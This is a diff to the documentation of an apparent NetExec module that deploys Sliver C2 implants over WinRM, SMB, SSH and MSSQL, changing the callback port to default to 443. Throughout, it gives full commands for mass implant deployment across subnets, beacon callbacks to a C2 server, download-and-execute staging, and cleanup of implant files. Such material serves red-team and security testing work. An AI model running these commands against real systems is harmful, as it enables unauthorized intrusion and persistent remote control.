@@ -50,17 +50,19 @@ The simplest deployment mode - uploads the full implant binary to the target and
 ```bash
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
-  -o RHOST=10.0.0.5 RPORT=8888
+  -o RHOST=10.0.0.5
 ```
 
 **What happens:**
 1. NetExec connects to `192.168.1.10` via WinRM
 2. Module generates unique Sliver implant (Windows/amd64, mTLS beacon)
-3. Implant configured to call back to `10.0.0.5:8888` (Sliver mTLS listener)
+3. Implant configured to call back to `10.0.0.5:443` (Sliver mTLS listener, default port)
 4. Implant uploaded to `C:\Windows\Temp\` via WinRM
 5. Implant executed on target
 6. Module waits 90 seconds for beacon callback
 7. Implant file deleted from target (CLEANUP=True by default)
+
+**Note:** `RPORT` defaults to 443 if not specified. To use a different port, add `RPORT=8888`.
 
 **Expected output:**
 ```
@@ -78,8 +80,10 @@ WINRM       192.168.1.10    5985   TARGET01  [+] Cleaned up implant file
 ```bash
 nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
   -M sliver_exec \
-  -o RHOST=192.168.1.100 RPORT=443
+  -o RHOST=192.168.1.100
 ```
+
+**Note:** Port 443 is used by default. For other ports, specify `RPORT=<port>`.
 
 **What happens:**
 1. NetExec scans `10.2.10.0/24` subnet for SMB targets
@@ -108,8 +112,10 @@ SMB         10.2.10.23      445    SERVER2       [+] Beacon registered: HAPPY_KE
 ```bash
 nxc ssh 192.168.1.50 -u root -p 'toor' \
   -M sliver_exec \
-  -o RHOST=10.0.0.5 RPORT=443 OS=linux ARCH=amd64
+  -o RHOST=10.0.0.5 OS=linux ARCH=amd64
 ```
+
+**Note:** Default port 443 is used for mTLS.
 
 **What happens:**
 1. Connects via SSH to Linux target
@@ -133,7 +139,7 @@ SSH         192.168.1.50    22     linuxbox      [+] Beacon registered: BLUE_MOU
 ```bash
 nxc mssql 192.168.1.100 -u sa -p 'SqlAdmin123!' \
   -M sliver_exec \
-  -o RHOST=10.0.0.5 RPORT=8888
+  -o RHOST=10.0.0.5
 ```
 
 **What happens:**
@@ -153,8 +159,8 @@ Lightweight deployment mode where the target downloads the implant from a Sliver
 ```bash
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
-  -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=powershell
+  -o RHOST=10.0.0.5 \
+     STAGING=True STAGER_PORT=8080
 ```
 
 **What happens:**
@@ -168,9 +174,14 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
    ```
 4. Target downloads implant from Sliver HTTP server
 5. Target executes downloaded implant
-6. Beacon calls back to mTLS listener (`10.0.0.5:8888`)
+6. Beacon calls back to mTLS listener (`10.0.0.5:443`, default)
 7. Module removes website and stops HTTP listener
 8. Implant file deleted from target
+
+**Note:** 
+- `STAGING_METHOD` defaults to `powershell` if not specified
+- `STAGER_RHOST` defaults to `RHOST` (same server for staging and C2)
+- Final C2 callback uses default port 443 unless `RPORT` is specified
 
 **Expected output:**
 ```
@@ -284,9 +295,11 @@ nxc ssh 192.168.1.50 -u root -p 'toor' \
 ```bash
 nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
   -M sliver_exec \
-  -o RHOST=192.168.1.100 RPORT=443 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=powershell
+  -o RHOST=192.168.1.100 \
+     STAGING=True STAGER_PORT=8080
 ```
+
+**Note:** `STAGING_METHOD` defaults to `powershell`
 
 **What happens:**
 - Each target gets a **unique implant** hosted on the same HTTP server
@@ -302,22 +315,24 @@ nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
 
 | Option | Default | Description |
 |--------|---------|-------------|
-| `RHOST` | **Required** | Sliver server IP for final C2 mTLS listener |
-| `RPORT` | `443` | Sliver mTLS listener port |
+| `RHOST` | **Required*** | Sliver server IP for final C2 mTLS listener |
+| `RPORT` | `443` | Sliver mTLS listener port (optional) |
 | `OS` | Auto-detect | Target OS (`windows` or `linux`) |
 | `ARCH` | `amd64` | Target architecture (`amd64` or `386`) |
 | `IMPLANT_BASE_PATH` | `/tmp` | Local temp directory for implant generation |
 | `CLEANUP` | `True` | Remove implant file from target after beacon callback |
 | `WAIT` | `90` | Seconds to wait for beacon callback |
 | `FORMAT` | `exe` | Implant format (only `exe` supported currently) |
-| `STAGING` | `False` | Enable TCP/HTTP shellcode staging (legacy) or HTTP download staging |
-| `STAGER_PORT` | None | If set, enables HTTP download staging; HTTP port for hosting implant |
+| `STAGING` | `False` | Enable staging mode |
+| `STAGER_RHOST` | `RHOST` | Stager listener IP (defaults to same as RHOST) |
+| `STAGER_RPORT` | `RPORT` | Stager listener port (defaults to same as RPORT) |
+| `STAGER_PORT` | `8080` | HTTP port for hosting implant (enables HTTP download staging) |
+| `STAGER_PROTOCOL` | `http` | Stager protocol: `tcp`, `http`, or `https` (for shellcode staging) |
 | `STAGING_METHOD` | `powershell` | Download method - Windows: `powershell`, `certutil`, `bitsadmin`; Linux: `wget`, `curl`, `python` |
-| `STAGER_RHOST` | None | (Legacy) Stager listener IP for TCP/HTTP shellcode injection |
-| `STAGER_RPORT` | None | (Legacy) Stager listener port for shellcode injection |
-| `STAGER_PROTOCOL` | `http` | (Legacy) Stager protocol: `tcp`, `http`, or `https` |
 | `PROFILE` | None | Use existing Sliver profile instead of generating new implant |
 | `SHARE` | `C$` | SMB share for file upload (SMB protocol only) |
+
+*\* Either `RHOST` or `PROFILE` must be provided*
 
 ### Using Sliver Profiles
 
@@ -347,6 +362,8 @@ nxc winrm 192.168.1.10 -u admin -p pass \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 IMPLANT_BASE_PATH=/opt/implants
 ```
+
+**Note:** Explicitly specify `RPORT` when using non-default ports.
 
 **Use case:** Store generated implants in specific directory for forensics/analysis.
 
@@ -422,7 +439,7 @@ sliver > mtls -l 0.0.0.0 -p 443
 # 2. Scan and deploy
 nxc smb 10.2.10.0/24 -u 'CORP\admin' -p 'P@ssw0rd!' \
   -M sliver_exec \
-  -o RHOST=192.168.1.100 RPORT=443 WAIT=60
+  -o RHOST=192.168.1.100 WAIT=60
 
 # 3. Interact with beacons
 sliver > beacons
@@ -443,7 +460,7 @@ sliver > mtls -l 0.0.0.0 -p 8888
 nxc winrm 192.168.1.50 -u Administrator -p 'SecurePass!' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=powershell \
+     STAGING=True STAGER_PORT=8080 \
      WAIT=120
 
 # 3. Verify beacon and cleanup occurred
@@ -460,13 +477,15 @@ sliver > websites  # Website should be removed
 # Windows targets via SMB
 nxc smb 10.2.10.0/24 -u admin -p pass \
   -M sliver_exec \
-  -o RHOST=192.168.1.100 RPORT=443
+  -o RHOST=192.168.1.100
 
 # Linux targets via SSH
 nxc ssh 10.2.20.0/24 -u root -p pass \
   -M sliver_exec \
-  -o RHOST=192.168.1.100 RPORT=443 OS=linux
+  -o RHOST=192.168.1.100 OS=linux
 
 # Check all beacons
 sliver > beacons
 ```
+
+**Note:** Using default port 443 for both Windows and Linux beacons.
